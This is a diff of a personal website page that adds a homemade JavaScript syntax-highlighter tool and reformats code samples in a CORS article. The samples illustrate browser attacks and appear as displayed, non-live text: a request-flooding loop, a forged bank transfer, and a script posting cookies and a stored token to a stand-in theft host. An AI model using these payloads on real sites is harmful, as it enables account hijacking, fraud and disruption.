@@ -308,7 +308,7 @@
             }
 
         textarea {
-            width: 95%;
+            width: 99%;
             height: 60px;
         }
 
@@ -341,6 +341,10 @@
 
             code.js .decl {
                 color: #0100FF;
+            }
+
+            code.js .stmnt {
+                color: #8F08C4;
             }
 
             code.js .class {
@@ -878,6 +882,7 @@
                 <div class="block">
                     <div class="title"><h1>What's new?</h1></div>
                     <div>
+                        <p><span>Code: Source code to HTML convertor beta </span><a href="?section=code-to-html" onclick="UI.navigate('code-to-html'); return false;">released</a></p>
                         <p><span>Photos: Beautiful moments </span><a href="?section=photos-moments" onclick="UI.navigate('photos-moments'); return false;">updated</a></p>
                         <p><span>Article: CORS </span><a href="?section=article-cors" onclick="UI.navigate('article-cors'); return false;">published</a></p>
                     </div>
@@ -1065,6 +1070,13 @@
                         <p><a href="?section=photos-moments" onclick="UI.navigate('photos-moments'); return false;">View</a></p>
                     </div>
                 </div>
+                <div class="block">
+                    <div class="title"><h1>Code: Code to HTML convertor beta</h1></div>
+                    <div>
+                        <p><span>A very simple source code to HTML convertor \ syntax highlighter.</span></p>
+                        <p><a href="?section=code-to-html" onclick="UI.navigate('code-to-html'); return false;">Try</a></p>
+                    </div>
+                </div>
             </section>
             <section class="container flex" style="display:none;" id="links" data-title="Links">
                 <script type="text/javascript">
@@ -1224,13 +1236,13 @@
                                     <p>
                                         <span>
                                             <code class="code-block html js">
-                                                <span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span>
-                                                <br /><span class="indent"><span class="method">setInterval</span>(() => {</span>
-                                                <br /><span class="indent-2"><span class="decl">const</span> xmlHttp = new <span class="class">XMLHttpRequest</span>();</span>
-                                                <br /><span class="indent-2">xmlHttp.<span class="method">open</span>(<span class="string">'POST'</span>, <span class="string">'https://attackablesite.com/contactme'</span>, true);</span>
-                                                <br /><span class="indent-2">xmlHttp.<span class="method">send</span>(<span class="string">'subject=Your+site+is+down'</span>);</span>
-                                                <br /><span class="indent">}, 1000);</span>
-                                                <br /><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span>
+                                                <span class="line"><span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;<span class="method">setInterval</span>(<span class="method"></span>(<span class="normal"></span>)<span class="normal"></span> <span class="normal"></span>=<span class="normal"></span>><span class="normal"></span> <span class="normal"></span>{</span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="normal"></span>=<span class="normal"></span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span>(<span class="normal"></span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">open</span>(<span class="string">'POST'</span><span class="normal"></span>,<span class="normal"></span> <span class="string">'https://attackablesite.com/contactme'</span><span class="normal"></span>,<span class="normal"></span> <span class="decl">true</span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">send</span>(<span class="string">'subject=Your+site+is+down'</span><span class="normal"></span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal"></span>}<span class="normal"></span>,<span class="normal"></span> <span class="normal">1000</span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line"><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span></span>
                                             </code>
                                         </span>
                                     </p>
@@ -1249,11 +1261,11 @@
                                     <p>
                                         <span>
                                             <code class="code-block html js">
-                                                <span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span>
-                                                <br /><span class="indent"><span class="decl">const</span> xmlHttp = new <span class="class">XMLHttpRequest</span>();</span>
-                                                <br /><span class="indent">xmlHttp.<span class="method">open</span>(<span class="string">'POST'</span>, <span class="string">'https://somenotsafeuserbank.com/transfers'</span>, true);</span>
-                                                <br /><span class="indent">xmlHttp.<span class="method">send</span>(<span class="string">'receivingaccount=malicious&amount=100'</span>);</span>
-                                                <br /><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span>
+                                                <span class="line"><span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="normal"></span>=<span class="normal"></span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span>(<span class="normal"></span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">open</span>(<span class="string">'POST'</span><span class="normal"></span>,<span class="normal"></span> <span class="string">'https://somenotsafeuserbank.com/transfers'</span><span class="normal"></span>,<span class="normal"></span> <span class="decl">true</span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">send</span>(<span class="string">'receivingaccount=malicious&amount=100'</span><span class="normal"></span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line"><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span></span>
                                             </code>
                                         </span>
                                     </p>
@@ -1274,11 +1286,11 @@
                                     <p>
                                         <span>
                                             <code class="code-block html js">
-                                                <span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span>
-                                                <br /><span class="indent"><span class="decl">const</span> xmlHttp = new <span class="class">XMLHttpRequest</span>();</span>
-                                                <br /><span class="indent">xmlHttp.<span class="method">open</span>(<span class="string">'POST'</span>, <span class="string">'https://userdatatheft.com/'</span>, true);</span>
-                                                <br /><span class="indent">xmlHttp.<span class="method">send</span>(<span class="string">'cookie='</span> + document.cookie + <span class="string">'&token='</span> + window.localStorage.<span class="method">getItem</span>(<span class="string">'token'</span>));</span>
-                                                <br /><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span>
+                                                <span class="line"><span class="brace">&lt;</span><span class="tag">script</span><span class="brace">&gt;</span></span>
+                                                <br /><span class="line">&nbsp;&nbsp;<span class="decl">const</span> <span class="normal">xmlHttp</span> <span class="normal"></span>=<span class="normal"></span> <span class="decl">new</span> <span class="class">XMLHttpRequest</span>(<span class="normal"></span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">open</span>(<span class="string">'POST'</span><span class="normal"></span>,<span class="normal"></span> <span class="string">'https://userdatatheft.com/'</span><span class="normal"></span>,<span class="normal"></span> <span class="decl">true</span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line">&nbsp;&nbsp;<span class="normal">xmlHttp</span>.<span class="method">send</span>(<span class="string">'cookie='</span><span class="normal"></span> <span class="normal"></span>+<span class="normal"></span> <span class="normal">document</span>.<span class="normal">cookie</span> <span class="normal"></span>+<span class="normal"></span> <span class="string">'&token='</span><span class="normal"></span> <span class="normal"></span>+<span class="normal"></span> <span class="normal">window</span>.<span class="normal">localStorage</span>.<span class="method">getItem</span>(<span class="string">'token'</span><span class="normal"></span>)<span class="normal"></span>)<span class="normal"></span>;</span>
+                                                <br /><span class="line"><span class="brace">&lt;/</span><span class="tag">script</span><span class="brace">&gt;</span></span>
                                             </code>
                                         </span>
                                     </p>
@@ -1347,6 +1359,262 @@
                             <img src="photos/photos-moments/2005-2.preview.jpg" alt="2005" onclick="UI.copyToPopup(this);" />
                             <img src="photos/photos-moments/2005-3.preview.jpg" alt="2005" onclick="UI.copyToPopup(this);" />
                         </div>
+                    </div>
+                </div>
+            </section>
+            <section class="container flex" style="display:none;" id="code-to-html" data-title="Code to Html">
+                <script type="text/javascript">
+                    if (!window.Code2Html) {
+                        window.Code2Html = {
+                            create: function (options) {
+                                let _codeCss = 'code-block html js';
+                                let _tagCss = 'tag';
+                                let _braceCss = 'brace';
+                                let _declarationCss = 'decl';
+                                let _statementCss = 'stmnt';
+                                let _classCss = 'class';
+                                let _methodCss = 'method';
+                                let _stringCss = 'string';
+                                let _normalCss = 'normal';
+                                let _lineCss = 'line';
+                                let _initialIndent = 0;
+
+                                initOptions(options);
+
+                                const _separators = ['.', ',', ';', ':', '!', '&', '|', '-', '+', '*', '/', '=', '>', '<', '{', '}', '(', ')', '[', ']'];
+                                const _quotes = ['\'', '"'];
+                                const _spaces = [' ', '\t'];
+
+                                function convert(code) {
+                                    let result = '';
+                                    result += '<code class="' + _codeCss + '">';
+                                    const lines = code.split(/\r?\n/);
+                                    let indent = _initialIndent;
+                                    for (let l = 0; l < lines.length; l++) {
+                                        const line = lines[l];
+
+                                        result += '<span class="' + _lineCss + '">';
+
+                                        let resultLine = '';
+
+                                        let indentChangeBrace = 0;
+                                        let indentChangeStmnt = 0;
+                                        let lineContentStarted = false;
+                                        let stringLiteralQuote = '';
+                                        let stringLiteral = false;
+                                        let lexeme = '';
+                                        let prevLexeme = '';
+                                        for (let i = 0; i < line.length; i++) {
+                                            const ch = line[i];
+
+                                            if (!lineContentStarted) {
+                                                if (_spaces.indexOf(ch) < 0) {
+                                                    lineContentStarted = true;
+                                                }
+                                                else {
+                                                    continue;
+                                                }
+                                            }
+
+                                            if (_quotes.indexOf(ch) >= 0) {
+                                                if (!stringLiteral) {
+                                                    stringLiteral = true;
+                                                    stringLiteralQuote = ch;
+
+                                                    resultLine += '<span class="' + _stringCss + '">';
+                                                    resultLine += ch;
+                                                }
+                                                else if (stringLiteralQuote === ch) {
+                                                    stringLiteral = false;
+
+                                                    resultLine += ch;
+                                                    resultLine += '</span>';
+                                                }
+                                                else {
+                                                    resultLine += ch;
+                                                }
+                                            }
+                                            else if (!stringLiteral) {
+                                                if ((_separators.indexOf(ch) >= 0) || (_spaces.indexOf(ch) >= 0)) {
+                                                    const lexemeType = _getLexemeType(lexeme, prevLexeme, ch);
+                                                    const lexemeCss = _getLexemeCss(lexemeType);
+                                                    resultLine += '<span class="' + lexemeCss + '">' + lexeme + '</span>' + ch;
+
+                                                    if (lexeme == 'if' || lexeme == 'else' || lexeme == 'switch' || lexeme == 'case' || lexeme == 'default' || lexeme == 'for' || lexeme == 'while') {
+                                                        indentChangeStmnt = 1;
+                                                    }
+                                                    else if (lexeme == 'return' || lexeme == 'break' || lexeme == 'continue') {
+                                                        indentChangeStmnt = -1;
+                                                    }
+                                                    prevLexeme = lexeme;
+                                                    lexeme = '';
+                                                }
+                                                else {
+                                                    lexeme += ch;
+                                                }
+
+                                                if (ch === '{') {
+                                                    indentChangeBrace = 1;
+                                                }
+                                                else if (ch === '}') {
+                                                    indentChangeBrace = -1;
+                                                }
+                                            } else {
+                                                if (ch == '<') {
+                                                    resultLine += '&lt;';
+                                                }
+                                                else if (ch == '>') {
+                                                    resultLine += '&gt;';
+                                                } else {
+                                                    resultLine += ch;
+                                                }
+                                            }
+                                        }
+
+                                        if (lexeme) {
+                                            const lexemeType = _getLexemeType(lexeme, prevLexeme);
+                                            const lexemeCss = _getLexemeCss(lexemeType);
+                                            resultLine += '<span class="' + lexemeCss + '">' + lexeme + '</span>';
+
+                                            if (lexeme == 'if' || lexeme == 'else' || lexeme == 'switch' || lexeme == 'case' || lexeme == 'default' || lexeme == 'for' || lexeme == 'while') {
+                                                indentChangeStmnt = 1;
+                                            }
+                                            else if (lexeme == 'return' || lexeme == 'break' || lexeme == 'continue') {
+                                                indentChangeStmnt = -1;
+                                            }
+                                            prevLexeme = lexeme;
+                                            lexeme = '';
+                                        }
+
+                                        if (indentChangeBrace < 0) {
+                                            indent += indentChangeBrace;
+                                        }
+
+                                        for (let i = 0; i < indent; i++) {
+                                            resultLine = '&nbsp;&nbsp;' + resultLine;
+                                        }
+
+                                        if (indentChangeBrace > 0) {
+                                            indent += indentChangeBrace;
+                                        }
+                                        else if (indentChangeStmnt > 0) {
+                                            indent += indentChangeStmnt;
+                                        }
+
+                                        if ((indentChangeBrace >= 0) && (indentChangeStmnt < 0)) {
+                                            indent += indentChangeStmnt;
+                                        }
+
+                                        result += resultLine;
+                                        result += '</span>';
+                                        result += '\n<br />';
+                                    }
+
+                                    result += '</code>';
+                                    return result;
+                                };
+
+
+                                function initOptions(options) {
+                                    if (!options)
+                                        return;
+
+                                    if (options.tagCss) {
+                                        _tagCss = options.tagCss;
+                                    }
+                                    if (options.braceCss) {
+                                        _braceCss = options.braceCss;
+                                    }
+                                    if (options.declarationCss) {
+                                        _declarationCss = options.declarationCss;
+                                    }
+                                    if (options.statementCss) {
+                                        _statementCss = options.statementCss;
+                                    }
+                                    if (options.classCss) {
+                                        _classCss = options.classCss;
+                                    }
+                                    if (options.methodCss) {
+                                        _methodCss = options.methodCss;
+                                    }
+                                    if (options.stringCss) {
+                                        _stringCss = options.stringCss;
+                                    }
+                                    if (options.normalCss) {
+                                        _normalCss = options.normalCss;
+                                    }
+                                    if (options.lineCss) {
+                                        _lineCss = options.lineCss;
+                                    }
+
+                                    if (options.initialIndent) {
+                                        _initialIndent = options.initialIndent;
+                                    }
+                                }
+
+
+
+                                function _getLexemeType(lexeme, prevLexeme, nextCh) {
+                                    if (lexeme === 'new' || lexeme === 'var' || lexeme === 'const' || lexeme === 'let' || lexeme === 'function' || lexeme === 'class' || lexeme === 'true' || lexeme === 'false')
+                                        return 'declaration';
+                                    if (lexeme === 'for' || lexeme === 'while' || lexeme === 'break' || lexeme === 'continue' || lexeme === 'if' || lexeme === 'else' || lexeme === 'switch' || lexeme === 'case' || lexeme === 'default' || lexeme === 'return')
+                                        return 'statement';
+                                    if (nextCh === '(') {
+                                        if (prevLexeme === 'new')
+                                            return 'class';
+                                        else
+                                            return 'method';
+                                    }
+                                };
+
+                                function _getLexemeCss(lexemeType) {
+                                    if (lexemeType === 'tag')
+                                        return _tagCss;
+                                    if (lexemeType === 'brace')
+                                        return _braceCss;
+                                    if (lexemeType === 'declaration')
+                                        return _declarationCss;
+                                    if (lexemeType === 'statement')
+                                        return _statementCss;
+                                    if (lexemeType === 'class')
+                                        return _classCss;
+                                    if (lexemeType === 'method')
+                                        return _methodCss;
+                                    if (lexemeType === 'string')
+                                        return _stringCss;
+
+                                    return _normalCss;
+                                };
+
+                                return { convert };
+                            }
+                        }
+                    }
+
+                    function TestCode2Html() {
+                        const code = document.getElementById('code-to-html-src').value;
+                        const html = Code2Html.create({ initialIndent: parseInt(document.getElementById('code-to-html-indent').value) }).convert(code);
+                        document.getElementById('code-to-html-html').value = html;
+                        document.getElementById('code-to-html-preview').innerHTML = html;
+                    }
+                </script>
+                <div class="container">
+                    <div class="block">
+                        <div class="title"><h1>My Code to Html</h1></div>
+                        <div>
+                            <p><span>Here is a beta-version of my own implementation of source code to HTML convertor \ syntax highlighter.</span></p>
+                            <p><span>For now, only JavaScript is (partially) supported. However, I've already used it for my site.</span></p>
+                            <p><span>This far from ideal implementation took me about 4 hours.</span></p>
+                            <p><span class="highlighted-red"><i>C# support cooming soon.</i></span></p>
+                        </div>
+                    </div>
+                    <div class="block">
+                        <div class="title"><h1>The playground</h1></div>
+                        <p><label>Code to convert:<textarea id="code-to-html-src" style="resize:vertical;height:160px;"></textarea></label></p>
+                        <p><label>Initial indent:<input type="number" id="code-to-html-indent" style="width:60px" value="0" /></label></p>
+                        <p><span><button class="color-1" onclick="TestCode2Html()">Convert</button></span></p>
+                        <p><label>Preview:<span id="code-to-html-preview"><code class="code-block" style="min-height:60px"></code></span></label></p>
+                        <p><label>Html:<textarea id="code-to-html-html" style="resize:vertical;height:80px;"></textarea></label></p>
                     </div>
                 </div>
             </section>
